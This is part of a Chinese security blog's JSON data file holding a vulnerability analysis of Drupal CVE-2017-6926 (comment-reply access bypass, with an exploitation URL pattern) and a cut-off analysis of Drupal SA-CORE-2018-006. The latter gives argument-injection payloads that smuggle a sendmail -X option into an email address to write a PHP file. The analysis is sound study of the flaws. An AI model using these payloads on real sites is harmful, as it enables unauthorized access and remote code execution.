decode:true\">comment.reply:\n  path: '/comment/reply/{entity_type}/{entity}/{field_name}/{pid}'\n  defaults:\n    _controller: '\\Drupal\\comment\\Controller\\CommentController::getReplyForm'\n    _title: 'Add new comment'\n    pid: ~\n  requirements:\n    _custom_access: '\\Drupal\\comment\\Controller\\CommentController::replyFormAccess'\n  options:\n    parameters:\n      entity:\n        type: entity:{entity_type}\n</pre>\n可见replyFormAccess其实是getReplyForm方法的权限检查模块，传入replyFormAccess方法的参数将会是{entity_type}/{entity}/{field_name}/{pid}\n\n我们实际测一下，访问这个模块，看看发送的参数是什么样子的：\n\n对kingsguard test评论进行评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png)\n\n注意看url：[http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1](http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1)\n\n{entity_type}：node\n\n{entity}：1\n\n{field_name}：comment\n\n{pid}：1\n\n现在可以明确了，传入replyFormAccess里的entity类型是node节点类型，接着下断看下entity的数据\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-2.png)\n\n在大概知道$entity是什么之后，我们再来看下补丁代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-2.png)\n\n可见补丁加了一个判断\n<pre class=\"lang:default decode:true\">andIf(AccessResult::allowedIf($entity-&gt;access('view')));</pre>\n看下allowedIf方法是怎么实现的：\n<pre class=\"lang:default decode:true \">public static function allowedIf($condition) {\n  return $condition ? static::allowed() : static::neutral();\n}</pre>\n可见allowedIf通过传入的参数的True/False来判断是否有权限进行操作。\n\n这样看来，$entity-&gt;access('view')只有True/False两种可能出现的值。\n\n我们在后台下断，并且构造一个$test方法值等于$entity-&gt;access('view')，下断看看$test何时能为False:\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-2.png)\n\n首先来找找，关于回复评论处的权限设置:\n\n我们在admin账号下，发表一片名为kingsguard的文章，此文章有一个kingsguard test的评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png)\n\n我们将kingsguard test 这条评论的权限编辑成不公开\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png)\n\n我们用admin账号回复一下这个评论，后台看下$$test = $entity-&gt;access('view');的值：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-1.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-1.png)\n\n毫无疑问，$test的值是true\n\n现在用另一个账号登录，也访问\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6这个连接试试：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-1.png)\n\n$test仍然为true。\n\n当时笔者就是掉到这个坑里了，明明这条评论设置为不公开，为什么不同用户访问，$entity-&gt;access('view')都是true呢？\n\n后来证明了，其实这里的$entity，指的不是评论，而是这篇文章，$entity-&gt;access('view')也同样不是单条评论的是否有view权限，而是这篇文章是否有view权限。\n\n其实观察url就可以发现这个问题了：\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6（回复第一篇文章的第六个评论）\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6（回复第二篇文章的第六个评论）\n\n显然这里的1和2，指的是文章的编号，同时也是entity的编号，那显然entity指的是文章而不是评论。\n\n我们用admin账号编辑kingsguard这篇文章，把published选项的勾去掉：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-1.png)\n\n这时候用admin账号回复kingsguard test这条评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-1.png)\n\n对于admin账号来说，$entity-&gt;access('view');仍为true\n\n再用其他账号登录：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-1.png)\n\n因为admin账号发布的文章都被admin账号设置为不公开了，所以这里看不到任何文章。\n\n继续用这个账号访问：\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-1.png)\n\n**可以看到，虽然文章不公开，仍然可以看到不公开文章的评论，并且还能对评论进行回复。**\n\n再看下后台下的断点：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-1.png)\n\n此时的$entity-&gt;access('view')变成了false\n\n## **CVE-2017-6926 利用验证**\n\n假设id为{node_id}的文章被作者设置为不公开，想查看/回复此文章的id为{comment_id}的评论。\n\n访问[http://x.x.x.x/comment/reply/node/{node_id}/comment/{comment_id}](http://x.x.x.x/comment/reply/node/%7bnode_id%7d/comment/%7bcomment_id%7d)\n\n## CVE-2017-6926 漏洞修复\n\n升级Drupal至最新版本","slug":"drupal8-cve-2017-6926","published":1,"updated":"2020-10-27T09:27:09.630Z","_id":"ckgrozu980030wsa97spmhmgc","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/drupal.png\"></p>\n<p>近期，著名的Drupal CMS网站爆出7个漏洞，其中1个严重漏洞CVE-2017-6926，具有发表评论权限的用户可以查看他们无权访问的内容和评论，并且还可以为该内容添加评论。</p>\n<p>本篇文章对Drupal 8 - CVE-2017-6926漏洞进行了详细分析。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"CVE-2017-6926-漏洞详情\"><a href=\"#CVE-2017-6926-漏洞详情\" class=\"headerlink\" title=\"CVE-2017-6926 漏洞详情\"></a>CVE-2017-6926 漏洞详情</h2><p>先看下drupal官网的通告：</p>\n<p><a href=\"https://www.drupal.org/sa-core-2018-001\">https://www.drupal.org/sa-core-2018-001</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-2.png\"></p>\n<p>有发布评论权限的用户，可以查看他们无权访问的内容和评论。</p>\n<p>并且还可以为此内容添加评论。</p>\n<p>想要触发这个漏洞，必须启用评论系统，并且攻击者必须有权发布评论。</p>\n<p>从漏洞描述来看，问题可能出在评论的权限控制上了。</p>\n<p>但是这里有一个坑，笔者当时就掉进去了：这里的权限，指的是文章的权限？还是评论的权限呢？是攻击者可以访问他们不公开的评论呢？还是攻击者可以访问不公开的文章的公开评论呢？下面我会详细的分析这个漏洞，并给出上面问题的答案。</p>\n<p>漏洞是在8.4.5上解决的，看一下8.4.5修改的内容：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-2.png\"></p>\n<p>这里在CommentController.php（评论控制器）里加上了一个对entity实体是否有view权限的判断。</p>\n<p>这个好理解，之前没有对entity的权限进行判断，导致不可view的entity也通过了权限检查，从而导致了越权。</p>\n<p>我们看下关于entity的介绍：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-1.png\"></p>\n<p>我们再看下漏洞存在的函数</p>\n<p>\\core\\modules\\comment\\src\\Controller\\CommentController.php</p>\n<pre class=\"lang:default decode:true\">public function replyFormAccess(EntityInterface $entity, $field_name, $pid = NULL) {\n  // Check if entity and field exists.\n  $fields = $this-&gt;commentManager-&gt;getFields($entity-&gt;getEntityTypeId());\n  if (empty($fields[$field_name])) {\n    throw new NotFoundHttpException();\n  }\n  $account = $this-&gt;currentUser();\n\n  // Check if the user has the proper permissions.\n  $access = AccessResult::allowedIfHasPermission($account, 'post comments');\n  $status = $entity-&gt;{$field_name}-&gt;status;\n  $access = $access-&gt;andIf(AccessResult::allowedIf($status == CommentItemInterface::OPEN)\n    -&gt;addCacheableDependency($entity));</pre>\n<p>再来看下这个方法的路由</p>\n<p>\\core\\modules\\comment\\comment.routing.yml</p>\n<pre class=\"lang:default decode:true\">comment.reply:\n  path: '/comment/reply/{entity_type}/{entity}/{field_name}/{pid}'\n  defaults:\n    _controller: '\\Drupal\\comment\\Controller\\CommentController::getReplyForm'\n    _title: 'Add new comment'\n    pid: ~\n  requirements:\n    _custom_access: '\\Drupal\\comment\\Controller\\CommentController::replyFormAccess'\n  options:\n    parameters:\n      entity:\n        type: entity:{entity_type}\n</pre>\n<p>可见replyFormAccess其实是getReplyForm方法的权限检查模块，传入replyFormAccess方法的参数将会是{entity_type}/{entity}/{field_name}/{pid}</p>\n<p>我们实际测一下，访问这个模块，看看发送的参数是什么样子的：</p>\n<p>对kingsguard test评论进行评论：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png\"></p>\n<p>注意看url：<a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1\">http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1</a></p>\n<p>{entity_type}：node</p>\n<p>{entity}：1</p>\n<p>{field_name}：comment</p>\n<p>{pid}：1</p>\n<p>现在可以明确了，传入replyFormAccess里的entity类型是node节点类型，接着下断看下entity的数据</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-2.png\"></p>\n<p>在大概知道$entity是什么之后，我们再来看下补丁代码：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-2.png\"></p>\n<p>可见补丁加了一个判断</p>\n<pre class=\"lang:default decode:true\">andIf(AccessResult::allowedIf($entity-&gt;access('view')));</pre>\n<p>看下allowedIf方法是怎么实现的：</p>\n<pre class=\"lang:default decode:true \">public static function allowedIf($condition) {\n  return $condition ? static::allowed() : static::neutral();\n}</pre>\n<p>可见allowedIf通过传入的参数的True/False来判断是否有权限进行操作。</p>\n<p>这样看来，$entity-&gt;access(‘view’)只有True/False两种可能出现的值。</p>\n<p>我们在后台下断，并且构造一个$test方法值等于$entity-&gt;access(‘view’)，下断看看$test何时能为False:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-2.png\"></p>\n<p>首先来找找，关于回复评论处的权限设置:</p>\n<p>我们在admin账号下，发表一片名为kingsguard的文章，此文章有一个kingsguard test的评论：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png\"></p>\n<p>我们将kingsguard test 这条评论的权限编辑成不公开</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png\"></p>\n<p>我们用admin账号回复一下这个评论，后台看下$$test = $entity-&gt;access(‘view’);的值：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-1.png\"></p>\n<p>毫无疑问，$test的值是true</p>\n<p>现在用另一个账号登录，也访问</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6%E8%BF%99%E4%B8%AA%E8%BF%9E%E6%8E%A5%E8%AF%95%E8%AF%95%EF%BC%9A\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6这个连接试试：</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-1.png\"></p>\n<p>$test仍然为true。</p>\n<p>当时笔者就是掉到这个坑里了，明明这条评论设置为不公开，为什么不同用户访问，$entity-&gt;access(‘view’)都是true呢？</p>\n<p>后来证明了，其实这里的$entity，指的不是评论，而是这篇文章，$entity-&gt;access(‘view’)也同样不是单条评论的是否有view权限，而是这篇文章是否有view权限。</p>\n<p>其实观察url就可以发现这个问题了：</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6%EF%BC%88%E5%9B%9E%E5%A4%8D%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%AC%E5%85%AD%E4%B8%AA%E8%AF%84%E8%AE%BA%EF%BC%89\">http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6（回复第一篇文章的第六个评论）</a></p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6%EF%BC%88%E5%9B%9E%E5%A4%8D%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%AC%E5%85%AD%E4%B8%AA%E8%AF%84%E8%AE%BA%EF%BC%89\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6（回复第二篇文章的第六个评论）</a></p>\n<p>显然这里的1和2，指的是文章的编号，同时也是entity的编号，那显然entity指的是文章而不是评论。</p>\n<p>我们用admin账号编辑kingsguard这篇文章，把published选项的勾去掉：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-1.png\"></p>\n<p>这时候用admin账号回复kingsguard test这条评论：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-1.png\"></p>\n<p>对于admin账号来说，$entity-&gt;access(‘view’);仍为true</p>\n<p>再用其他账号登录：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-1.png\"></p>\n<p>因为admin账号发布的文章都被admin账号设置为不公开了，所以这里看不到任何文章。</p>\n<p>继续用这个账号访问：</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-1.png\"></p>\n<p><strong>可以看到，虽然文章不公开，仍然可以看到不公开文章的评论，并且还能对评论进行回复。</strong></p>\n<p>再看下后台下的断点：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-1.png\"></p>\n<p>此时的$entity-&gt;access(‘view’)变成了false</p>\n<h2 id=\"CVE-2017-6926-利用验证\"><a href=\"#CVE-2017-6926-利用验证\" class=\"headerlink\" title=\"CVE-2017-6926 利用验证\"></a><strong>CVE-2017-6926 利用验证</strong></h2><p>假设id为{node_id}的文章被作者设置为不公开，想查看/回复此文章的id为{comment_id}的评论。</p>\n<p>访问<a href=\"http://x.x.x.x/comment/reply/node/%7bnode_id%7d/comment/%7bcomment_id%7d\">http://x.x.x.x/comment/reply/node/{node_id}/comment/{comment_id}</a></p>\n<h2 id=\"CVE-2017-6926-漏洞修复\"><a href=\"#CVE-2017-6926-漏洞修复\" class=\"headerlink\" title=\"CVE-2017-6926 漏洞修复\"></a>CVE-2017-6926 漏洞修复</h2><p>升级Drupal至最新版本</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/勒索软件Ransomware防御领域.jpg","excerpt":"<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/drupal.png\"></p>\n<p>近期，著名的Drupal CMS网站爆出7个漏洞，其中1个严重漏洞CVE-2017-6926，具有发表评论权限的用户可以查看他们无权访问的内容和评论，并且还可以为该内容添加评论。</p>\n<p>本篇文章对Drupal 8 - CVE-2017-6926漏洞进行了详细分析。</p>","more":"<h2 id=\"CVE-2017-6926-漏洞详情\"><a href=\"#CVE-2017-6926-漏洞详情\" class=\"headerlink\" title=\"CVE-2017-6926 漏洞详情\"></a>CVE-2017-6926 漏洞详情</h2><p>先看下drupal官网的通告：</p>\n<p><a href=\"https://www.drupal.org/sa-core-2018-001\">https://www.drupal.org/sa-core-2018-001</a></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-2.png\"></p>\n<p>有发布评论权限的用户，可以查看他们无权访问的内容和评论。</p>\n<p>并且还可以为此内容添加评论。</p>\n<p>想要触发这个漏洞，必须启用评论系统，并且攻击者必须有权发布评论。</p>\n<p>从漏洞描述来看，问题可能出在评论的权限控制上了。</p>\n<p>但是这里有一个坑，笔者当时就掉进去了：这里的权限，指的是文章的权限？还是评论的权限呢？是攻击者可以访问他们不公开的评论呢？还是攻击者可以访问不公开的文章的公开评论呢？下面我会详细的分析这个漏洞，并给出上面问题的答案。</p>\n<p>漏洞是在8.4.5上解决的，看一下8.4.5修改的内容：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-2.png\"></p>\n<p>这里在CommentController.php（评论控制器）里加上了一个对entity实体是否有view权限的判断。</p>\n<p>这个好理解，之前没有对entity的权限进行判断，导致不可view的entity也通过了权限检查，从而导致了越权。</p>\n<p>我们看下关于entity的介绍：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-1.png\"></p>\n<p>我们再看下漏洞存在的函数</p>\n<p>\\core\\modules\\comment\\src\\Controller\\CommentController.php</p>\n<pre class=\"lang:default decode:true\">public function replyFormAccess(EntityInterface $entity, $field_name, $pid = NULL) {\n  // Check if entity and field exists.\n  $fields = $this-&gt;commentManager-&gt;getFields($entity-&gt;getEntityTypeId());\n  if (empty($fields[$field_name])) {\n    throw new NotFoundHttpException();\n  }\n  $account = $this-&gt;currentUser();\n\n  // Check if the user has the proper permissions.\n  $access = AccessResult::allowedIfHasPermission($account, 'post comments');\n  $status = $entity-&gt;{$field_name}-&gt;status;\n  $access = $access-&gt;andIf(AccessResult::allowedIf($status == CommentItemInterface::OPEN)\n    -&gt;addCacheableDependency($entity));</pre>\n<p>再来看下这个方法的路由</p>\n<p>\\core\\modules\\comment\\comment.routing.yml</p>\n<pre class=\"lang:default decode:true\">comment.reply:\n  path: '/comment/reply/{entity_type}/{entity}/{field_name}/{pid}'\n  defaults:\n    _controller: '\\Drupal\\comment\\Controller\\CommentController::getReplyForm'\n    _title: 'Add new comment'\n    pid: ~\n  requirements:\n    _custom_access: '\\Drupal\\comment\\Controller\\CommentController::replyFormAccess'\n  options:\n    parameters:\n      entity:\n        type: entity:{entity_type}\n</pre>\n<p>可见replyFormAccess其实是getReplyForm方法的权限检查模块，传入replyFormAccess方法的参数将会是{entity_type}/{entity}/{field_name}/{pid}</p>\n<p>我们实际测一下，访问这个模块，看看发送的参数是什么样子的：</p>\n<p>对kingsguard test评论进行评论：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png\"></p>\n<p>注意看url：<a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1\">http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1</a></p>\n<p>{entity_type}：node</p>\n<p>{entity}：1</p>\n<p>{field_name}：comment</p>\n<p>{pid}：1</p>\n<p>现在可以明确了，传入replyFormAccess里的entity类型是node节点类型，接着下断看下entity的数据</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-2.png\"></p>\n<p>在大概知道$entity是什么之后，我们再来看下补丁代码：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-2.png\"></p>\n<p>可见补丁加了一个判断</p>\n<pre class=\"lang:default decode:true\">andIf(AccessResult::allowedIf($entity-&gt;access('view')));</pre>\n<p>看下allowedIf方法是怎么实现的：</p>\n<pre class=\"lang:default decode:true \">public static function allowedIf($condition) {\n  return $condition ? static::allowed() : static::neutral();\n}</pre>\n<p>可见allowedIf通过传入的参数的True/False来判断是否有权限进行操作。</p>\n<p>这样看来，$entity-&gt;access(‘view’)只有True/False两种可能出现的值。</p>\n<p>我们在后台下断，并且构造一个$test方法值等于$entity-&gt;access(‘view’)，下断看看$test何时能为False:</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-2.png\"></p>\n<p>首先来找找，关于回复评论处的权限设置:</p>\n<p>我们在admin账号下，发表一片名为kingsguard的文章，此文章有一个kingsguard test的评论：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png\"></p>\n<p>我们将kingsguard test 这条评论的权限编辑成不公开</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png\"></p>\n<p>我们用admin账号回复一下这个评论，后台看下$$test = $entity-&gt;access(‘view’);的值：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-1.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-1.png\"></p>\n<p>毫无疑问，$test的值是true</p>\n<p>现在用另一个账号登录，也访问</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6%E8%BF%99%E4%B8%AA%E8%BF%9E%E6%8E%A5%E8%AF%95%E8%AF%95%EF%BC%9A\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6这个连接试试：</a></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-1.png\"></p>\n<p>$test仍然为true。</p>\n<p>当时笔者就是掉到这个坑里了，明明这条评论设置为不公开，为什么不同用户访问，$entity-&gt;access(‘view’)都是true呢？</p>\n<p>后来证明了，其实这里的$entity，指的不是评论，而是这篇文章，$entity-&gt;access(‘view’)也同样不是单条评论的是否有view权限，而是这篇文章是否有view权限。</p>\n<p>其实观察url就可以发现这个问题了：</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6%EF%BC%88%E5%9B%9E%E5%A4%8D%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%AC%E5%85%AD%E4%B8%AA%E8%AF%84%E8%AE%BA%EF%BC%89\">http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6（回复第一篇文章的第六个评论）</a></p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6%EF%BC%88%E5%9B%9E%E5%A4%8D%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%AC%E5%85%AD%E4%B8%AA%E8%AF%84%E8%AE%BA%EF%BC%89\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6（回复第二篇文章的第六个评论）</a></p>\n<p>显然这里的1和2，指的是文章的编号，同时也是entity的编号，那显然entity指的是文章而不是评论。</p>\n<p>我们用admin账号编辑kingsguard这篇文章，把published选项的勾去掉：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-1.png\"></p>\n<p>这时候用admin账号回复kingsguard test这条评论：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-1.png\"></p>\n<p>对于admin账号来说，$entity-&gt;access(‘view’);仍为true</p>\n<p>再用其他账号登录：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-1.png\"></p>\n<p>因为admin账号发布的文章都被admin账号设置为不公开了，所以这里看不到任何文章。</p>\n<p>继续用这个账号访问：</p>\n<p><a href=\"http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6\">http://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6</a></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-1.png\"></p>\n<p><strong>可以看到，虽然文章不公开，仍然可以看到不公开文章的评论，并且还能对评论进行回复。</strong></p>\n<p>再看下后台下的断点：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-1.png\"></p>\n<p>此时的$entity-&gt;access(‘view’)变成了false</p>\n<h2 id=\"CVE-2017-6926-利用验证\"><a href=\"#CVE-2017-6926-利用验证\" class=\"headerlink\" title=\"CVE-2017-6926 利用验证\"></a><strong>CVE-2017-6926 利用验证</strong></h2><p>假设id为{node_id}的文章被作者设置为不公开，想查看/回复此文章的id为{comment_id}的评论。</p>\n<p>访问<a href=\"http://x.x.x.x/comment/reply/node/%7bnode_id%7d/comment/%7bcomment_id%7d\">http://x.x.x.x/comment/reply/node/{node_id}/comment/{comment_id}</a></p>\n<h2 id=\"CVE-2017-6926-漏洞修复\"><a href=\"#CVE-2017-6926-漏洞修复\" class=\"headerlink\" title=\"CVE-2017-6926 漏洞修复\"></a>CVE-2017-6926 漏洞修复</h2><p>升级Drupal至最新版本</p>"},{"title":"Drupal Core SA-CORE-2018-006 mail() 函数代码注入漏洞分析","date":"2018-10-29T07:41:11.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日，Drupal官方发布安全通告修复了多个安全性问题，其中包括2个严重的远程代码执行漏洞，影响Drupal 7和8的多个版本。其中一个漏洞源于在发送emai时，一些变量没有进行适当的处理就传给了shell执行，因此可能导致远程代码执行。\n\n<!--more-->\n\n漏洞预警可以参考这里\n> [http://blog.nsfocus.net/drupal/](http://blog.nsfocus.net/drupal/)\n> &nbsp;\n\n## 漏洞Mail方法\n\n本次漏洞出现在PhpMail.php中\n\n下面看下存在漏洞的mail方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/7b3ec22d68ca3f737740cfbde1e6e74d.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/e6c094a322e293af6b7286802a09d627.png)\n\n&nbsp;\n\n接下来可以看下drupal在8.6.2版本中修补的代码，如下两张图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/de76deb7a29b39a4ab95e25ec4a38217.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/a1b281f3aed8cf59026a14442a04b465.png)\n\n&nbsp;\n\n通过这个补丁可以看出，8.6.2版的drupal对$message['Return-Path']值进行了验证，通过后拼接”-f”赋值与$additional_headers。\n\n## PHP中的mail方法\n\n下面看下php中的mail方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/01afad47e39f44b21cfccb74fc0fd63a.png)\n\nMail方法接收五个参数，这里我们重点关注第五个参数 $additional_parameters\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/5dc80b4f40894e4d8d691929e69a8114.png)\n\n从参数说明可以看出，这个$additional_parameters参数通常是用于将其他参数传递来设置发送邮件时的一些属性，比如使用的-f参数，用来配置封发件人地址\n\n&nbsp;\n\n比如说如下例子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/c6d1790a12a88536d3b6c17c296a28fd.png)\n\nDrupal中的作用也是如此的，如下图8.6.1版本的存在漏洞的drupal代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/8e47c743abe46e0c2dee73dfa002e2b2.png)\n\n判断是否存在$message[‘Return-Path’],如果有，就拼接”-f”作为mail的$additional_parameters参数进行使用。\n\n&nbsp;\n\n**mail**函数第五个参数漏洞。看到这里，有没有想起来之前16年的PHPMailer漏洞？当时我也曾对这个漏洞进行过分析，链接如下：\n\nhttp://blog.nsfocus.net/phpmailer-vulnerability-analysis/\n\n&nbsp;\n\n漏洞原理极其相似，甚至在利用上都是一样的\n\n## 漏洞利用方法\n\n简单的介绍下一种利用方法：\n\n在传递$additional_parameters参数时，由于没有进行有效的过滤，我们可以在后面构造出 -X参数，这个参数的作用是指定写入log的文件路径，然后就可以将可执行的代码通过邮件正文写入我们制定位置的日志文件中去。Payload类似这样的\n<pre class=\"lang:default decode:true\">xxx( -X/var/www/test.php )@qq.com</pre>\n&nbsp;\n\n最终的$additional_parameters参数类似这样的：\n<pre class=\"lang:default decode:true\">-fxxx( -X/var/www/success.php )@qq.com</pre>\n&nbsp;\n\n然而呢？\n\nPHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了escapeshellarg来防止注入参数，但是当时这个补丁是可以被**绕过**的。\n\n看下当时PHPMailer怎么补的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/d18fe8585c9dc5b41e7706f6be101bde.png)\n\nPHPMailer的补丁中，对传入的参数使用escapeshellarg进行过滤，但是php中mail方法自身用使用了escapeshellcmd进行处理，最终用这两个方法配合，反而弄巧成拙，造成绕过，具体的可以参考当时的那个漏洞，很有意思，这里不细说了,具体的可以看下那个漏洞。\n\n&nbsp;\n\n温故下escapeshellarg和escapeshellcmd用法：\n\n&nbsp;\n\n### escapeshellcmd：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/7fadb4b66067265bd5be80a393fd6069.png)\n\n### 